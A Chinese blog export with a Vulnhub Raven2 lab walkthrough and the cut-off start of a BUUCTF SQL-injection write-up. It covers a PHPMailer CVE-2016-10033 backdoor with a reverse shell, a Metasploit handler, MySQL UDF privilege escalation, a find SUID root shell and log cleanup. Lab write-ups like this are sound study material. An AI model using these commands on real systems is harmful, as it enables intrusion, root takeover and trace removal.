    <url>/2022/05/20/%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="wp">WP</h2><ol type="1"><li>导入靶机，VMware直接：文件-》打开》选择下载好的.ova文件即可</li><li>编辑，虚拟网络编辑器，默认NAT模式，ok，看到靶机网段是192.168.123.0</li></ol><blockquote><p>WP参考🔗：https://icepeak.icu/2021/07/19/vulnhub-ba-chang-raven2/</p><p>https://www.freebuf.com/articles/web/261047.html</p></blockquote><h3 id="主机发现扫描">主机发现扫描</h3><p><code>nmap -sP 192.168.123.0/24</code>，得到靶机ip：192.168.123.129</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520153255252.png" alt="image-20220520153255252" style="zoom:67%;"></p><p>==如果攻击机是linux的话，arp-scan -l 也可以==</p><h3 id="扫端口">扫端口</h3><p>nmap默认扫常用端口<code>nmap 192.168.123.129</code></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520153538837.png" alt="image-20220520153538837" style="zoom:67%;"></p><h3 id="端口开放扫目录">80端口开放，扫目录</h3><p><code>dirsearch -u 192.168.123.129 -i 200</code></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520153805766.png" alt="image-20220520153805766"></p><p>网站是apache，直接用漏扫工具vulmap，poc master扫一下，都没用洞</p><h3 id="flag1">flag1</h3><p>进入/vendor/</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520154842047.png" alt="image-20220520154842047" style="zoom:67%;"></p><p>随便点点文件，找到flag1，并且给出了网站绝对路径/var/www/html/vendor/</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520154540630.png" alt="image-20220520154540630"></p><h3 id="phpmailer-getshell">phpmailer getshell</h3><h4 id="法一使用searchsploit漏洞库中的poc">法一：使用searchsploit漏洞库中的POC</h4><p>进入README.md文件，发现应用phpmailer</p><p>它安装的版本是5.2.16，而且readme、security文件都提示这个应用有漏洞，RCE：<code>CVE-2016-10033</code></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520155317385.png" alt="image-20220520155317385"></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520155433993.png" alt="image-20220520155433993" style="zoom:67%;"></p><p>msf search一下漏洞</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520160107309.png" alt="image-20220520160107309" style="zoom:67%;"></p><p>好像不是rce，再用searchsploit搜一下，尝试40974.py文件</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520163147152.png" alt="image-20220520163147152" style="zoom:67%;"></p><p><code>searchsploit -m 40974</code>，下载脚本到当前目录</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520163457491.png" alt="image-20220520163457491" style="zoom:80%;"></p><p>漏洞详情：https://github.com/opsxcq/exploit-CVE-2016-10033</p><p>漏洞页面：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520171033029.png" alt="image-20220520171033029" style="zoom:50%;"></p><p>就跟之前漏扫的contact.php很像</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520171142349.png" alt="image-20220520171142349" style="zoom:50%;"></p><p>exp会生成后门文件</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520171108119.png" alt="image-20220520171108119" style="zoom:67%;"></p><p>直接运行py文件报错，提示没有模块，pip install就行了，然后看一下py文件内容再运行</p><p>修改一下其中的内容+参数</p><ul><li>开头，防止乱码出现错误</li></ul><pre><code class="hljs d"><span class="hljs-meta">#!/usr/bin/python</span># -*- coding: utf-<span class="hljs-number">8</span> -*-</code></pre><ul><li>backdoor为生成的后门文件，名字自定</li></ul><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520220534742.png" alt="image-20220520220534742"></p><p>然后kali运行py文件</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520220653605.png" alt="image-20220520220653605" style="zoom:67%;"></p><p>网页访问contact.php，会生成后门hello.php，然后kali监听本地4444端口（提前开放）</p><p>访问http://192.168.123.129/hello.php，一直在转，而kali这边收到shell</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520221100987.png" alt="image-20220520221100987" style="zoom:67%;"></p><p>进入交互式shell</p><pre><code class="hljs swift">python -<span class="hljs-built_in">c</span> &#x27;<span class="hljs-keyword">import</span> pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</code></pre><h4 id="法二msf一键利用exp">法二：msf一键利用exp</h4><p>这里没有用msf，后续发现msf也有exp，可以直接用，操作类似，<code>info 0</code>查看exp详情</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220521165546240.png" alt="image-20220521165546240"></p><p>见https://www.freebuf.com/articles/web/261047.html</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220521170324960.png" alt="image-20220521170324960"></p><p>注意，一开始运行失败，后门切换到root就可以了，不知道为啥，可能是权限不够</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220521172858750.png" alt="image-20220521172858750"></p><p>这里也可以像法1一样用searsploit的脚本然后用msf的handle模块监听即可</p><pre><code class="hljs gams">msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; <span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>payload <span class="hljs-comment">=&gt; windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>msf <span class="hljs-comment">exploit(handler) &gt; set lhost 192.168.123.134</span>lhost <span class="hljs-comment">=&gt; 192.168.123.134</span>msf <span class="hljs-comment">exploit(handler) &gt; set lport 4444</span>lport <span class="hljs-comment">=&gt; 4444</span>msf <span class="hljs-comment">exploit(handler) &gt; run</span></code></pre><p>msf可能卡在收到session，但一直进不去，可以<strong>ctrlc先退出监听</strong>，再sessions -i进入</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522084302397.png" alt="image-20220522084302397"></p><h3 id="flag2">flag2</h3><p>进入到工作目录，得到flag2</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520221753424.png" alt="image-20220520221753424" style="zoom:50%;"></p><p>找flag文件</p><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">name</span> <span class="hljs-built_in">flag</span>*</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520222205997.png" alt="image-20220520222205997" style="zoom:67%;"></p><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>wordpress<span class="hljs-regexp">/wp-content/u</span>ploads<span class="hljs-regexp">/2018/</span><span class="hljs-number">11</span>/flag3.png<span class="hljs-regexp">/var/</span>www/flag2.txt</code></pre><h3 id="flag3">flag3</h3><p><strong>命令行怎么看png图片？</strong></p><p>​ --去浏览器看</p><p>​ --<a href="https://blog.csdn.net/IOT_Flower/article/details/71189329">eog命令</a>、还有其他需安装的工具命令也可以</p><p>成功得到flag3</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520222310681.png" alt="image-20220520222310681" style="zoom:50%;"></p><p>那flag4就是msf提权才能拿到了，通过udf提权使得在mysql执行系统root才能访问的命令，比如看/root</p><h3 id="msf提权">msf提权</h3><blockquote><p><strong>udf提权的利用条件以及数据库版本问题</strong></p><p>获得一个数据库账号，拥有MySQL的insert和delete权限，最好是root。拥有将udf.dll写入相应目录的权限。(secure_file_priv为空)</p></blockquote><p>查看本地开放端口，<code>netstat -lpnut</code>3306开放，这里127.0.0.1表示只对本地开放</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220521155938157.png" alt="image-20220521155938157" style="zoom:50%;"></p><p>搜索一下mysql目录，没看到config相关文件，想到是wordpress，cms配置文件看下：<code>wp-config.php</code></p><blockquote><p>因为wordpress搭建网站肯定有数据库配置文件的，通过它寻找数据库账号密码</p></blockquote><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220521160452598.png" alt="image-20220521160452598" style="zoom:50%;"></p><p>得到MySQL账号密码root、R@v3nSecurity</p><h4 id="登录mysql后信息搜集一下">登录mysql后信息搜集一下</h4><p>查看版本、用户、mysql目录，可以看到mysql是root权限</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220521161008937.png" alt="image-20220521161008937" style="zoom:67%;"></p><pre><code class="hljs asciidoc">select @@secure<span class="hljs-emphasis">_file_</span>priv;查看有没有文件操作权限使用 select @@plugin<span class="hljs-emphasis">_dir 查看当前数据库扩展插件存放的位置</span><span class="hljs-emphasis">也可以</span><span class="hljs-emphasis">show variables like &#x27;%plugin%&#x27;;</span><span class="hljs-emphasis"></span><span class="hljs-emphasis">如果不存在的话可以在 webshell 中找到 MySQL 的安装目录然后手工创建 \lib\plugin 文件夹：</span><span class="hljs-emphasis">mysql &gt; select 233 into dumpfile &#x27;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_</span>allocation&#x27;;通过 NTFS ADS流创建文件夹成功率不高，目前 MySQL 官方貌似已经阉割了这个功能。那么如果找到 MySQL 的安装目录呢？通用也有对应的 SQL 语句可以查询出来mysql&gt; select @@basedir;<span class="hljs-code">+------------------+</span>| @@basedir        |<span class="hljs-code">+------------------+</span>| /usr/local/mysql |<span class="hljs-code">+------------------+</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220521163439745.png" alt="image-20220521163439745" style="zoom:50%;"></p><h4 id="法一使用metasploit自带的动态链接库手动写入">法一：使用metasploit自带的动态链接库手动写入</h4><p>可以直接在msf里使用searchsploit</p><pre><code class="hljs angelscript">searchsploit <span class="hljs-number">1518</span></code></pre><h5 id="写入动态链接库">写入动态链接库</h5><p>如果存在SQL注入的话，可以通过sqlmap参数来上传动态链接库，但需要满足一定条件</p><p>没有注入的话，用SQL语句，条件：secure_file_priv 无限制</p><pre><code class="hljs sql"><span class="hljs-comment"># 直接 SELECT 查询十六进制写入</span><span class="hljs-keyword">SELECT</span> <span class="hljs-number">0x7f454c4602</span>... <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">DUMPFILE</span> <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;<span class="hljs-comment"># 解码十六进制再写入多此一举</span><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">unhex</span>(<span class="hljs-string">&#x27;7f454c4602...&#x27;</span>) <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">DUMPFILE</span> <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;</code></pre><blockquote><p><a href="https://www.sqlsec.com/tools/udf.html">MySQL UDF提权十六进制内容查询</a></p></blockquote><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522163416984.png" alt="image-20220522163416984"></p><p>这里好像因为文件内容太长，写不进去文件，但是测试发现是可以写入短的</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522163324524.png" alt="image-20220522163324524" style="zoom:67%;"></p><p>那就换种方法，wget下载下来:kali开启http服务,靶机下载到本机然后mysql读取文件导入到plugin</p><blockquote><p><a href="https://blog.csdn.net/zr1213159840/article/details/123671790?spm=1001.2101.3001.6650.12&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-12-123671790-blog-107928557.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-12-123671790-blog-107928557.pc_relevant_default&amp;utm_relevant_index=16">kali中搭建简单http服务的四种方法（其中几种在其他linux中也适用）</a></p></blockquote><pre><code class="hljs angelscript"><span class="hljs-number">1.</span>python3 -m http.server <span class="hljs-number">80</span>   /运行在哪个目录，网站的根目录就在哪<span class="hljs-number">2.</span>php -S <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">8080</span>  /同上，可以使用-t指定目录。<span class="hljs-number">3.</span>ruby -run -e httpd . -p <span class="hljs-number">9000</span><span class="hljs-number">4.</span>busybox httpd -f -p <span class="hljs-number">3333</span></code></pre><p>msf动态链接库位置：</p><pre><code class="hljs awk">whereis metasploit-frameworkcd <span class="hljs-regexp">/usr/</span>share/metasploit-frameworkcd .<span class="hljs-regexp">/data/</span>exploits/mysql</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522170121354.png" alt="image-20220522170121354"></p><p>复制so文件到桌面，然后在桌面运行web服务，就可以在靶机上wget下载文件了</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522170631043.png" alt="image-20220522170631043" style="zoom:67%;"></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522170621093.png" alt="image-20220522170621093" style="zoom:67%;"></p><p>靶机shell下载：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522170937082.png" alt="image-20220522170937082" style="zoom:67%;"></p><p>然后进入MySQL，利用into file写入so文件</p><pre><code class="hljs reasonml">mysql -uroot -pR@v3nSecurityselect load<span class="hljs-constructor">_file(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">var</span><span class="hljs-operator">/</span><span class="hljs-params">www</span><span class="hljs-operator">/</span><span class="hljs-params">html</span><span class="hljs-operator">/</span><span class="hljs-params">lib_mysqludf_sys_64</span>.<span class="hljs-params">so</span>&#x27;)</span> into dumpfile &#x27;/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so&#x27;;   <span class="hljs-comment">//outfile会有特殊的转换，而dumpfile是原数据导出</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522171713377.png" alt="image-20220522171713377"></p><h5 id="绑定函数到动态链接库">绑定函数到动态链接库</h5><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> sys_eval <span class="hljs-keyword">RETURNS</span> <span class="hljs-keyword">STRING</span> <span class="hljs-keyword">SONAME</span> <span class="hljs-string">&#x27;lib_mysqludf_sys_64.so&#x27;</span>;</code></pre><h5 id="使用系统函数">使用系统函数</h5><p><span style="background:#FF9999;">注意</span>：MySQL msfudf提权后不像以前一样返回一个shell操作，需要继续在mysql执行语句进行后续操作以验证</p><p>验证一下:MySQL查询添加的函数</p><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func;</code></pre><p>利用自定义函数改变find命令权限</p><pre><code class="hljs reasonml">select sys<span class="hljs-constructor">_exec(&#x27;<span class="hljs-params">chmod</span> <span class="hljs-params">u</span>+<span class="hljs-params">s</span> <span class="hljs-operator">/</span><span class="hljs-params">usr</span><span class="hljs-operator">/</span><span class="hljs-params">bin</span><span class="hljs-operator">/</span><span class="hljs-params">find</span>&#x27;)</span>;</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522171911074.png" alt="image-20220522171911074" style="zoom:67%;"></p><h3 id="flag4">flag4</h3><p>之前找的flag地址：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522172846268.png" alt="image-20220522172846268" style="zoom:67%;"></p><ol type="1"><li>直接利用函数查看flag文件：</li></ol><pre><code class="hljs reasonml">select sys<span class="hljs-constructor">_eval(&#x27;<span class="hljs-params">find</span> <span class="hljs-operator">/</span> -<span class="hljs-params">name</span> <span class="hljs-params">flag</span><span class="hljs-operator">*</span>&#x27;)</span>;    select sys<span class="hljs-constructor">_eval(&#x27;<span class="hljs-params">cat</span> <span class="hljs-operator">/</span><span class="hljs-params">root</span><span class="hljs-operator">/</span><span class="hljs-params">flag4</span>.<span class="hljs-params">txt</span>&#x27;)</span>;  <span class="hljs-comment">//成功拿到flag4</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522173000803.png" alt="image-20220522173000803" style="zoom:67%;"></p><ol start="2" type="1"><li>也可以suid提权，赋予命令root权限，然后去执行命令的exec参数即可进入root的shell</li></ol><pre><code class="hljs awk">select sys_eval(<span class="hljs-string">&#x27;chmod u+s /usr/bin/find&#x27;</span>); <span class="hljs-regexp">//</span>给find命令所有者的suid权限，使其可以执行root命令，之后可以退出mysql，在www的shell下使用<span class="hljs-regexp">/usr/</span>bin/find执行root权限touch aaafind aaa -exec <span class="hljs-string">&quot;/bin/sh&quot;</span> \;  <span class="hljs-regexp">//</span>在当前目录下找到aaa文件执行<span class="hljs-regexp">/bin/</span>sh提权，反斜杠 \ 代表结束的标志，与”<span class="hljs-regexp">/bin/</span>sh“ 之间有一个空格<span class="hljs-regexp">//</span>这就进入了root的shell，可以直接找flag，也可以上传个msf到msf执行后续操作</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522173741297.png" alt="image-20220522173741297" style="zoom:50%;"></p><p>后续操作，删除痕迹：删除自定义函数<code>drop function sys_exec;</code><code>Delete from mysql.func where name='sys_exec';</code></p><h4 id="法二一键msf操作失败">法二：一键msf操作（失败）</h4><blockquote><p>使用MSF中的 exploit/multi/mysql/mysql_udf_payload模块也可以进行UDF提权。MSF会将dll文件写入lib(前提是该目录存在，如果该目录不存在的话，则无法执行成功)，dll文件名为任意创建的名字。该dll文件中包含sys_exec()和sys_eval()两个函数，但是默认只创建sys_exec()函数，该函数执行并不会有回显。我们可以手动创建sys_eval() 函数，来执行有回显的命令。</p></blockquote><p>先开启外连，why？</p><p>​ https://blog.csdn.net/weixin_30481539/article/details/113632851</p><p>​ 提权是从MySQL的root提到系统的root</p><p>​默认root不外连，msf布置在另一台机器，需开启外连才能提权（在蚁剑/shell/能执行mysql语句的地方）</p><pre><code class="hljs sql">1. mysql -uroot -pR@v3nSecurity2. <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> *.* <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">IDENTIFIED</span> <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;R@v3nSecurity&#x27;</span> <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">OPTION</span>;  //&quot;%&quot;表示任何主机都可以远程登录到该服务器上访问3. <span class="hljs-keyword">flush</span> <span class="hljs-keyword">privileges</span>;   //因为MySQL把权限都放在了<span class="hljs-keyword">cache</span>中，所以在做完更改后需要重新加载。<span class="hljs-number">4.</span> 修改/etc/mysql/my.cnf，需要**root用户权限**。找到文件中的：bind-address = <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>将其注释掉，保存</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220521164015835.png" alt="image-20220521164015835"></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522111451574.png" alt="image-20220522111451574"></p><p>​</p><p>需满足3个条件才能外连，这里shell权限太低，不能改配置文件,无法外连</p><p>后续发现要想使用mysql_udf_payload模块MySQL需适应于5.5.9以下，这里靶机的mysql版本号为5.5.60，已经超出了版本限制，所以也不能提权</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522174429546.png" alt="image-20220522174429546" style="zoom:67%;"></p><h4 id="更多方法">更多方法：</h4><p>连上webshell后/可以上传文件的情况下，上传udf.php大马</p><h2 id="一些知识点">一些知识点</h2><h4 id="xshell上传下载文件">xshell上传下载文件</h4><p>利用xshell的<code>rz 、sz</code>下载vps上searchsploit生成的exp</p><blockquote><p><a href="https://www.php.cn/linux-438887.html">从linux服务器下载文件到本地的方法</a></p><p>运行rz，会将windows的文件传到linux服务器</p><p>运行<strong>sz</strong> filename，会将文件下载到windows本地</p></blockquote><h4 id="iptables开放端口">iptables开放端口</h4><p>【A是末尾追加，I是第一行追加】</p><pre><code class="hljs pgsql">iptables -A <span class="hljs-keyword">INPUT</span> -ptcp <span class="hljs-comment">--dport  端口号-j ACCEPT</span></code></pre><p>https://blog.csdn.net/weixin_37264997/article/details/80329786</p><p>验证开没开放：监听后nmap扫一下，有就是开放了</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520222651538.png" alt="image-20220520222651538"></p><h4 id="mysql查看当前用户">MySQL查看当前用户</h4><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>();<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">CURRENT_USER</span>();</code></pre><h4 id="升级完整性交互式shell"><a href="https://www.cnblogs.com/aaak/p/14067593.html">升级完整性交互式shell</a></h4><pre><code class="hljs routeros">[root@localhost ~]# python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>   #使用python回显标头[root@localhost ~]# ^Z      # ctrl + z 按键  挂起正在运行的程序 root@kali64:~# stty<span class="hljs-built_in"> raw </span>-echo      # 输入这句后 在输入命令终端不在显示 root@kali64:~# fg      # 把后台挂起的程序，放到控制台----》 终端不显示命令，输入后回车[root@localhost ~]# reset   # 将终端恢复至原始状态，之前的终端输入操作信息将都会被清空[root@localhost ~]# <span class="hljs-builtin-name">export</span> <span class="hljs-attribute">SHELL</span>=bash</code></pre><h4 id="linux快速开启http">linux快速开启http</h4><p><a href="https://blog.csdn.net/zr1213159840/article/details/123671790?spm=1001.2101.3001.6650.12&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-12-123671790-blog-107928557.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-12-123671790-blog-107928557.pc_relevant_default&amp;utm_relevant_index=16">kali中搭建简单http服务的四种方法（其中几种在其他linux中也适用）</a></p><h2 id="出现的问题">出现的问题</h2><h3 id="py模块下载问题">py模块下载问题</h3><p>本地win10运行exp的py文件时显示没有模块，下载模块又报错</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520172026202.png" alt="image-20220520172026202"></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520172038141.png" alt="image-20220520172038141"></p><p>谷歌发现是开代理的原因，把win代理关了就ok了</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520172113784.png" alt="image-20220520172113784"></p><h3 id="win10问题">win10问题</h3><p>运行exp后监听端口没收到，估计是要开放win10端口，为了安全起见还是不开了，转去kali好了</p><blockquote><p>win10 开启端口：https://www.jianshu.com/p/11df41ddfcdb</p><p>Win10开放防火墙中某一端口：https://blog.csdn.net/nihaize0520/article/details/80714108</p></blockquote><h3 id="开放了端口为什么nmap扫不到呢">开放了端口，为什么nmap扫不到呢？</h3><p>只有端口使用时nmap才扫得到</p><h3 id="位64位">32位？64位?</h3><p>mysql如何查看是32位还是64位？</p><pre><code class="hljs sql">mysql -V或mysql <span class="hljs-comment">--version</span>进入mysql,输入命令：<span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%version_%&#x27;</span>;或<span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%compile%&#x27;</span>;</code></pre><p>X64 表示64位</p><p>X86 表示32位</p><p>只带有win32.x86字样的是32位，带有win32.x86_64字样的是64位的。</p><p>这里看出是64位的，应该用64位的so文件</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522103007475.png" alt="image-20220522103007475"></p><blockquote><p>Win32 -&gt; 指的就是Windows系统； 64 bit- &gt;指的是Windows是64位的； AMD64 -&gt; 指的就是 CPU是x64的</p></blockquote><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522104007503.png" alt="image-20220522104007503" style="zoom: 67%;"></p><h3 id="开启外连失败">开启外连失败？</h3><p>https://blog.csdn.net/cj_Allen/article/details/104107013</p><p><a href="https://www.yisu.com/zixun/315246.html">如何解决远程连接mysql失败了的问题</a></p><p><a href="https://www.cnblogs.com/lemon-flm/p/7396536.html">Linux的netstat查看端口是否开放见解（0.0.0.0与127.0.0.1的区别）</a></p><ol type="1"><li>需要确定<strong>防火墙没有阻止3306端口</strong>，否则是无法通过3306端口连接到myql的。</li></ol><p><code>netstat -ano |find "3306"</code> 可以看到localaddress是127.0.0.1:3306说明当前的连接只是针对服务器本身的，此时是未开启外连的，也就是说其他处于公网的ip无法通过<strong>mysql-h114.116.30.20 -uroot -p</strong>连接到当前数据库（图上红圈圈错了）</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522113733723.png" alt="image-20220522113733723"></p><p>==<strong>Local</strong>==：访问端口的方式，<span style="background:#FFDBBB;"><strong>0.0.0.0是对外开放端口，说明3306端口外面可以访问</strong>；127.0.0.1说明只能对本机访问，外面访问不了此端口；</span></p><p><strong>Foregin Address</strong>：对外开放，一般都为0.0.0.0：*</p><ol start="2" type="1"><li>3306被绑定到了本地。检查一下my.cnf的配置，这里可以配置绑定ip地址。</li></ol><pre><code class="hljs ini"><span class="hljs-attr">bind-address</span>=addr</code></pre><p>不配置或者IP配置为0.0.0.0，表示监听所有客户端连接。如果是127.0.0.1：表示只能本地登录</p><p>但是靶机这里，my.cnf，www-data是不能编辑的，只能read</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522154602082.png" alt="image-20220522154602082" style="zoom:67%;"></p><p>配置文件里已经写死了ip</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522154635082.png" alt="image-20220522154635082" style="zoom:67%;"></p><ol start="3" type="1"><li>检查MySQL用户权限：</li></ol><p>MySQL建用户的时候会指定一个host，默认是127.0.0.1/localhost，那么这个用户就只能本机访问，其它机器用这个用户帐号访问会提示没有权限，host改为%，表示允许所有机器访问。</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522155317424.png" alt="image-20220522155317424" style="zoom: 67%;"></p><p><em>要想外连，需三个条件同时满足才行，这里只能满足3，所以不能外连</em></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场练习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF web刷题记录 WP</title>
    <link href="/2022/03/29/buu/"/>
    <url>/2022/03/29/buu/</url>
    
    <content type="html"><![CDATA[<h2 id="suctf-2019easysql">[SUCTF 2019]EasySQL</h2><blockquote><p><a href="https://www.cnblogs.com/gtx690/p/13176458.html">参考博客园WP1+常见sql_mode介绍</a></p><p><a href="https://blog.csdn.net/RABCDXB/article/details/111398725">CSDNWP2</a></p><p><a href="http://mysql.jsrun.net/">在线mysql执行🔗</a></p><p><a href="https://www.liaoxuefeng.com/wiki/1177760294764384/1179611432985088">在线mysql执行2🔗</a></p></blockquote><ul><li><span style="background:#ffbbff;"><strong>知识点：</strong></span></li></ul><pre><code class="hljs oxygene">堆叠查询后端代码猜测<span class="hljs-number">1</span> || ** ，||双作用<span class="hljs-keyword">set</span> sql_mode = pipes_as_concat 命令理解（为什么没有过滤<span class="hljs-keyword">set</span>、<span class="hljs-keyword">concat</span>的原因）</code></pre><p>万能密码' or '1'='1发现waf</p><p>尝试堆叠注入</p><p>输入query=1;select 2;返回Array ( [0] =&gt; 1 ) Array ( [0] =&gt; 2)，</p><p>query=1;select database();返回Array ( [0] =&gt; 1 ) Array ( [0] =&gt;ctf )，得到数据库：ctf，</p><p>query=1;show tables;返回Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag)，得到表Flag</p><ul><li><p>获取数据表结构:</p><p>desc 表名;</p><p>show columns from 表名;</p></li></ul><p>但是都被拦截，估计过滤了关键词flag</p><blockquote><p><a href="https://www.runoob.com/mysql/mysql-operator.html">mysql运算符</a></p></blockquote><p>mysq里逻辑运算符：与：and，或：or、||，非：not、！，异或：xor</p><p><strong>单个|是按位或运算符，&amp;是按位与，^是按位异或</strong></p><p>运算符优先级：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126153927429.png" alt="image-20220126153927429" style="zoom: 50%;"></p><h3 id="双作用或连接">||双作用：或、连接</h3><ol type="1"><li>逻辑或</li></ol><p>本地测试</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;a&#x27;</span>||<span class="hljs-string">&#x27;flag&#x27;</span>; //0<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>||<span class="hljs-string">&#x27;flag&#x27;</span>; //1<span class="hljs-keyword">SELECT</span> <span class="hljs-number">0</span>||<span class="hljs-string">&#x27;flag&#x27;</span>; //0<span class="hljs-keyword">SELECT</span> <span class="hljs-number">0</span>||<span class="hljs-keyword">id</span> <span class="hljs-keyword">from</span> student;  //1 student表里有id列名<span class="hljs-keyword">SELECT</span> <span class="hljs-number">0</span>||<span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-keyword">from</span> student;  //0<span 